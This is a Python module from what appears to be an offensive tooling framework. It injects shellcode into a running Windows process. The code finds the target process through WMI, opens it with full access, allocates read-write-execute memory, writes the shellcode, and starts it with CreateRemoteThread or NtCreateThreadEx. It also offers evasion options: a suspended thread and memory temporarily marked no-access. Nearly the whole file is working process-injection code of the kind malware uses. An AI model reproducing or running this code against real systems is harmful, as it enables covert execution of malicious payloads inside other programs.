import os
#import ctypes
from utils.windef import *
from utils.winconst import *

from utils.helper import nstate
from utils.helper import CheckFile, GetFileInfo

CATEGORY = 'inject'

def register_arguments(parser):
            parser.add_argument('-i', '--input', help='Input file or buffer for process injection')
            parser.add_argument('-p', '--process', help='Processname to inject the shellcode')

            grp = parser.add_argument_group('additional')
            #grp.add_argument('-b', '--buffer', required=False, default=None, help='For chaining from another module')
            grp.add_argument('-r', '--resume-thread', action='store_true', help='Start thread suspended and resume after speciefied time')
            grp.add_argument('-s', '--start', action='store_true', help='If not active, start the process before injection')
            grp.add_argument('-v', '--virtual-protect', action='store_true', help='Deny access on memory for a specified time')

class module:
    #from ctypes import windll
    #from ctypes import wintypes
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'cpu0x00, psycore8'
    Description = 'Inject shellcode to process'
    Version = '2.1.1'
    DisplayName = 'INJECTION'
    delay = 5
    data_size = 0
    hash = ''
    pid = int
    ntcrt = False
    relay = False

    def __init__(self, input, process_start, target_process, shellcode, resume_thread=None, virtual_protect=None):
        self.input = input
        self.process_start = process_start
        self.target_process = target_process
        self.shellcode = shellcode
        self.resume_thread = resume_thread
        self.virtual_protect = virtual_protect
        #self.payload_buffer = buffer

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'       : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'error.input'    : f'{nstate.s_fail} File {self.input} not found or cannot be opened.',    
            'post.done'      : f'{nstate.s_ok} DONE!',
            'proc.input_ok'  : f'{nstate.s_ok} File {self.input} loaded\n{nstate.s_ok} Size of shellcode {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
            'proc.input_try' : f'{nstate.s_note} Try to open file {self.input}',
            'proc.try'       : f'{nstate.s_note} Try to execute shellcode',
            'inj.run'        : f'{nstate.s_note} starting {self.target_process}',
            'inj.pid'        : f'{nstate.s_ok} {self.target_process} process id: {self.pid}',
            'inj.handle'     : f'{nstate.s_ok} Opened a Handle to the process',
            'inj.alloc'      : f'{nstate.s_ok} Allocated Memory in the process',
            'inj.write'      : f'{nstate.s_ok} Wrote The shellcode to memory',
            'inj.nacc'       : f'{nstate.s_note} VirtualProtectEx: PAGE_NO_ACCESS',
            'inj.susp'       : f'{nstate.s_note} CreateRemoteThread: START_SUSPENDED',
            'inj.inj_ok'     : f'{nstate.s_ok} Injected the shellcode into the process',
            'inj.rwe'        : f'{nstate.s_note} VirtualProtectEx: PAGE_READWRITE_EXECUTE',
            'inj.rest'       : f'{nstate.s_note} ResumeThread',
            'inj.resume'     : f'{nstate.s_ok} Process resumed'

        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def Start_Process(self):
        self.msg('inj.run')
        os.system(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        self.msg('inj.pid')
        return int(self.pid)

    def start_injection(self):
        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)

        process_id = self.get_proc_id()
        
        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            self.msg('inj.handle')

        memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory:
            self.msg('inj.alloc')

        #c_null = ctypes.c_int(0)
        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0) ##ctypes.byref(c_null))
        if writing:
            self.msg('inj.write')
        if self.virtual_protect:
            self.msg('inj.nacc')
            VirtualProtectEx(phandle, None, 0, 0x01, None)

        if self.resume_thread or self.virtual_protect:
            self.msg('inj.susp')
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
        elif self.ntcrt:
            th = HANDLE()
            Injection = pNtCreateThreadEx(ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, memory, None, False, 0, 0, 0, None)
        else:
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

        if Injection:
            self.msg('inj.inj_ok')

        if self.virtual_protect:
            self.msg('inj.rwe')
            VirtualProtectEx(phandle, None, 0, 0x40, None)

        if self.resume_thread or self.virtual_protect:
            self.sleep(self.delay)
            self.msg('inj.rest')
            resume = ResumeThread(Injection)
            if resume:
                self.msg('inj.resume')

        CloseHandle(phandle)

    def proc_inject():
        return False
    
    def open_file(self):
        try:
            with open(self.input, 'rb') as file:
                self.shellcode = file.read()
        except FileNotFoundError:
            return False
    
    def process(self):
        self.msg('pre.head')
        #if not self.chain:
        if isinstance(self.input, str):
            self.msg('proc.input_try')
            CheckFile(self.input)
            self.data_size, self.hash = GetFileInfo(self.input)
            self.msg('proc.input_ok')
            self.open_file()
            self.msg('proc.try')
            self.start_injection()
        #elif self.chain:
        elif isinstance(self.input, bytes):
            self.shellcode = self.input
            print('Inject buffer')
            self.start_injection()
        else:
            self.msg('error.input', True)
        self.msg('post.done')